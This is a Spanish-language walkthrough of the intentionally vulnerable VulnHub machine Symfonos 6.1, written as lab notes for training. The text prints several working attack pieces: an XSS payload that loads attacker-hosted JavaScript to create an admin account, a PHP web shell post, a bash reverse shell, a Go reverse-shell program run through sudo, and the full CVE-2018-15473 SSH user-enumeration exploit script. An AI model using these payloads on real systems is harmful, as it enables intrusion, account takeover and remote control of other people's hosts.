#vulnhub #ctf-machine #medium-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/symfonos-61,458/)

## Enumeración inicial
Primeramente procedemos con un escaneo ARP para identificar la dirección IP de la máquina víctima con `arp-scan`:
![[Pasted image 20240820105824.png]]

Si lanzamos una traza ICMP con `ping` podemos deducir de momento que se trata de una máquina Linux dado su TTL = 64:
![[Pasted image 20240820105931.png]]

### Nmap
Hacemos un escaneo inicial con `nmap` para detectar los puertos abiertos mediante TCP de la máquina víctima:
![[Pasted image 20240820110120.png]]

Como podemos ver están abiertos el puerto 22,80,3000,3306 y 5000. Escaneamos con `nmap` la versión y servicio que corren para cada uno de estos puertos:
![[Pasted image 20240820110638.png]]![[Pasted image 20240820110731.png]]

Si nos fijamos la versión de OpenSSH es la 7.4 por lo que tenemos una forma potencial de enumerar usuarios:
![[Pasted image 20240820111007.png]]

Si hacemos un último escaneo con `nmap` usando el script de Lua "http-enum" encontramos lo siguiente:
![[Pasted image 20240820111142.png]]

Si hacemos un análisis de la web que corre en el puerto 80 de la máquina podemos corroborar que se trata de un sistema Linux CentOS y que contiene una versión bastante antigua de PHP:
![[Pasted image 20240820111451.png]]

## Web Enumeration
Si accedemos a la web podemos ver lo siguiente:
![[Pasted image 20240820112244.png]]

Por lo que no hay nada interesante así que hacemos *fuzzing* de directorios con `wfuzz`:
![[Pasted image 20240820113332.png]]

Si seguimos haciendo *fuzzing* del directorio `posts/` encontramos los siguientes subdirectorios:
![[Pasted image 20240820115801.png]]

Y si nos fijamos en el directorio *includes* tenemos capacidad de *directory listing* y podemos ver que hay 2 archivos relacionados con la base de datos que seguramente contengan credenciales:
![[Pasted image 20240820115852.png]]

Si hacemos *fuzzing* con diccionarios más grandes por la web, encontramos otro subdirectorio en la raíz de la web llamado `flyspray`:
![[Pasted image 20240820131202.png]]

## XSS -> CSRF
Y al  entrar en él podemos ver:
![[Pasted image 20240820131240.png]]

Si hacemos *fuzzing* de directorios dentro de `/flyspray/` encontramos:
![[Pasted image 20240820131825.png]]

Si accedemos a `flyspray/docs/` podemos ver:
![[Pasted image 20240820131451.png]]

Y dentro de UPGRADING.txt podemos ver la versión del flyspray:
![[Pasted image 20240820131549.png]]

Por lo que si buscamos vulnerabilidades con `searchsploit` encontramos XSS -> CSRF:
![[Pasted image 20240820131656.png]]

Este *exploit* permite crear cuentas administradoras si apuntamos a nuestro codigo JS alojado en nuestra máquina abusando del parámetro *real_name* nuestra cuenta:
![[Pasted image 20240820132026.png]]
![[Pasted image 20240820132335.png]]

Por lo que si introducimos este nombre:
```
"><script src="http://192.168.1.21/xss.js"></script>
```

Recibimos una solicitud a nuestro archivo JS malicioso:
![[Pasted image 20240820133331.png]]

Por lo que la cuenta "hacker":"12345678" se crea como administradora. Si accedemos con la cuenta administradora podemos ver un reporte más que antes no veíamos:
![[Pasted image 20240820134306.png]]

Que si accedemos a él podemos ver unas credenciales de achiles:
![[Pasted image 20240820134250.png]]
## API Abusing
Si accedemos a la web que corre en el puerto 3000 podemos ver lo siguiente:
![[Pasted image 20240820120922.png]]

Y si accedemos a `/explore/users` podemos ver 2 usuarios:
![[Pasted image 20240820121014.png]]

Por lo que podemos comprobar si existen en la máquina víctima mediante SSH, ya que como hemos visto antes, la versión OpenSSH es vulnerable a enumeración de usuarios:
![[Pasted image 20240820121235.png]]

> [!NOTE] Para la enumeración de usuarios se ha utilizado este script: [[#Python script OpenSSH enumeration]]

Si probamos hacer fuerza bruta con `hydra` para autentificarnos por SSH podemos ver que no soporta la autenticación mediante contraseña:
![[Pasted image 20240820121741.png]]

Por lo cual podemos probar de autentificarnos en esta página con las credenciales encontradas anteriormente. Al acceder vemos 2 repositorios privados:
![[Pasted image 20240820134542.png]]

Donde podemos acceder al repositorio "symfonos-blog" y extraer las credenciales de la base de datos del archivo `includes/dbconfig.php` que se trata del archivo que haviamos visto antes gracias al *directory listing*:
![[Pasted image 20240820145324.png]]

Aun así no podemos conectarnos externamente al servicio MySQL de la máquina. Aun así podemos analizar el repositorio "symfonos-api" por lo que si analizamos el código podemos extraer todos estos *endpoints* de la API:

![[Pasted image 20240820150834.png]]
![[Pasted image 20240820150840.png]]
![[Pasted image 20240820150858.png]]
![[Pasted image 20240820150937.png]]
![[Pasted image 20240820150950.png]]
![[Pasted image 20240820151003.png]]
![[Pasted image 20240820151011.png]]
![[Pasted image 20240820151017.png]]

Por lo que si intentamos loguearnos con las credenciales que tenemos de "achilles" en el *endpoint* de login obtenemos acceso:
![[Pasted image 20240820151141.png]]

## RCE
Si analizamos `posts/index.php` del blog podemos ver como se hace uso de "preg_replace" con "e":
![[Pasted image 20240820152910.png]]

La cual cosa es peligroso, ya que si el contenido del post contiene ccódigo PHP, lo ejecutará. Por lo cual podemos usar la API para crear un post malicioso:
![[Pasted image 20240820153056.png]]

Si accedemos a la web podemos ver que tenemos ejecución de comandos:
![[Pasted image 20240820153129.png]]

Por lo que podemos entablar una *reverse shell* creando un post con:
```json
{
	"text": "system($_GET['cmd']);"
}
```

Y ejecutando este comando en el parámetro *cmd* de la URL:
```bash
bash -c "bash -i >& /dev/tcp/192.168.1.21/443 0>&1"
```
![[Pasted image 20240820153931.png]]

> [!NOTE] Hacemos el tratamiento de la TTY

![[Pasted image 20240820154426.png]]
![[Pasted image 20240820154502.png]]

## Escalada de privilegios
Una vez dentro de la máquina como usuario apache podemos probar de migrar a "achilles" con la contraseña que tenemos:
![[Pasted image 20240820155114.png]]

Una vez como "achilles" dentro de la máquina listamos los permisos a nivel de suoders y podemos ver como podemos ejecutar este binario de go: 
![[Pasted image 20240820161351.png]]

Por lo que podemos crear un archivo de go que ejecute comandos a nivel de sistema. Más concretamente que entable una reverse Shell:
```go
package main;
import "os/exec";
import "net";
func main(){
	c,_:=net.Dial("tcp","192.168.1.21:5000");
	cmd:=exec.Command("bash");
	cmd.Stdin=c;
	cmd.Stdout=c;
	cmd.Stderr=c;
	cmd.Run()
}
```

Sí ejecutamos el código en Go con *sudo* obtenemos una reverse Shell como *root*:
![[Pasted image 20240820161326.png]]
![[Pasted image 20240820161631.png]]

> [!NOTE] Volvemos a hacer el tratamiento de la TTY como antes.

Y si accedemos al directorio `/root` podemos visualizar la *flag*:
![[Pasted image 20240820161810.png]]

## Python script users enumeration via OpenSSH
```python
#!/usr/bin/env python2
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter


import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, args.port))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print '[!] Failed to negotiate SSH transport'
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print "[-] {} is an invalid username".format(username)
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print "[+] {} is a valid username".format(username)

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)
```

___
#xss #csrf #web-enumeration #information-leakage #abusing-sudoers #api-abuse 
___